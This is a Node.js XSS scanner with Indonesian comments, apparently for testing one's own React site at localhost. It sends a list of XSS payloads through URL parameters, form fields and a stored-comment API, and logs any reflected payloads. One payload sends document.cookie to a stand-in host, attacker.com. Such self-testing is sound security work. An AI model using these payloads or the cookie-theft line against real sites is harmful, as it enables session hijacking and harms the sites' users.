const axios = require('axios');
const fs = require('fs');

// URL target - ganti dengan URL website React Anda
const TARGET_URL = 'http://localhost:3000';

// Daftar payload XSS untuk diuji
const xssPayloads = [
  '<script>alert("XSS")</script>',
  '<img src="x" onerror="alert(\'XSS\')">',
  '<svg onload="alert(\'XSS\')">',
  '"><script>alert("XSS")</script>',
  '\' onclick=\'alert("XSS")\'',
  '<body onload="alert(\'XSS\')">',
  '<iframe src="javascript:alert(\'XSS\')">',
  '<a href="javascript:alert(\'XSS\')">Klik Disini</a>',
  '"><img src=x onerror=prompt(1)>',
  '<script>fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)</script>'
];

// Daftar endpoint yang umum rentan terhadap XSS
const endpoints = [
  '/search?q=',
  '/profile?name=',
  '/comment?text=',
  '/login?redirect=',
  '/dashboard'
];

// Daftar form fields yang mungkin rentan terhadap XSS
const formFields = [
  { endpoint: '/comment', field: 'text' },
  { endpoint: '/profile/update', field: 'name' },
  { endpoint: '/profile/update', field: 'bio' },
  { endpoint: '/contact', field: 'message' },
  { endpoint: '/search', field: 'query' }
];

// 1. Menguji XSS melalui parameter URL
async function testXSSThroughURLParameters() {
  console.log('Menguji serangan XSS melalui parameter URL...');
  
  for (const endpoint of endpoints) {
    for (const payload of xssPayloads) {
      const url = `${TARGET_URL}${endpoint}${encodeURIComponent(payload)}`;
      console.log(`Menguji: ${url}`);
      
      try {
        const response = await axios.get(url);
        console.log(`Status: ${response.status}`);
        
        // Memeriksa apakah payload XSS ada di respons (bisa berarti berhasil diinjeksi)
        if (response.data && response.data.includes(payload)) {
          console.log('\x1b[31m%s\x1b[0m', '[POTENSI VULNERABLE] Payload XSS ditemukan dalam respons!');
          fs.appendFileSync('xss_vulnerabilities.txt', `URL Parameter: ${url}\n`);
        }
      } catch (error) {
        console.log(`Error: ${error.message}`);
      }
      
      // Delay untuk menghindari rate limiting
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
}

// 2. Menguji XSS melalui form submissions
async function testXSSThroughForms() {
  console.log('\nMenguji serangan XSS melalui form submissions...');
  
  for (const form of formFields) {
    for (const payload of xssPayloads) {
      console.log(`Menguji payload pada ${form.endpoint}, field: ${form.field}`);
      
      const data = {};
      data[form.field] = payload;
      
      try {
        const response = await axios.post(`${TARGET_URL}${form.endpoint}`, data, {
          headers: {
            'Content-Type': 'application/json'
          }
        });
        
        console.log(`Status: ${response.status}`);
        
        // Memeriksa apakah payload XSS ada di respons
        if (response.data && response.data.includes(payload)) {
          console.log('\x1b[31m%s\x1b[0m', '[POTENSI VULNERABLE] Payload XSS ditemukan dalam respons!');
          fs.appendFileSync('xss_vulnerabilities.txt', `Form: ${form.endpoint}, Field: ${form.field}, Payload: ${payload}\n`);
        }
      } catch (error) {
        console.log(`Error: ${error.message}`);
      }
      
      // Delay untuk menghindari rate limiting
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
}

// 3. Menguji stored XSS dengan menyimpan payload ke database
async function testStoredXSS() {
  console.log('\nMenguji serangan Stored XSS...');
  
  // Contoh: menyimpan komentar dengan payload XSS
  for (const payload of xssPayloads) {
    const commentData = {
      author: 'Penguji',
      text: payload,
      postId: 1
    };
    
    try {
      console.log(`Mencoba menyimpan payload: ${payload}`);
      const response = await axios.post(`${TARGET_URL}/api/comments`, commentData, {
        headers: {
          'Content-Type': 'application/json'
        }
      });
      
      console.log(`Status: ${response.status}`);
      
      if (response.status === 200 || response.status === 201) {
        console.log('\x1b[33m%s\x1b[0m', '[BERHASIL DISIMPAN] Kemungkinan vulnerable terhadap stored XSS!');
        fs.appendFileSync('xss_vulnerabilities.txt', `Stored XSS: ${payload}\n`);
        
        // Mencoba mengakses halaman untuk melihat apakah payload dieksekusi
        const checkResponse = await axios.get(`${TARGET_URL}/post/1`);
        if (checkResponse.data && checkResponse.data.includes(payload)) {
          console.log('\x1b[31m%s\x1b[0m', '[VULNERABLE] Payload XSS tereksekusi saat mengakses halaman!');
        }
      }
    } catch (error) {
      console.log(`Error: ${error.message}`);
    }
    
    // Delay untuk menghindari rate limiting
    await new Promise(resolve => setTimeout(resolve, 1500));
  }
}

// Fungsi utama untuk menjalankan semua tes XSS
async function runXSSTests() {
  console.log('====== MEMULAI PENGUJIAN SERANGAN XSS ======');
  
  // Membuat file log jika belum ada
  if (!fs.existsSync('xss_vulnerabilities.txt')) {
    fs.writeFileSync('xss_vulnerabilities.txt', '=== LAPORAN KERENTANAN XSS ===\n\n');
  }
  
  await testXSSThroughURLParameters();
  await testXSSThroughForms();
  await testStoredXSS();
  
  console.log('\n====== PENGUJIAN XSS SELESAI ======');
  console.log('Lihat hasil detail di file xss_vulnerabilities.txt');
}

// Jalankan pengujian
runXSSTests().catch(error => {
  console.error('Terjadi kesalahan:', error);
}); 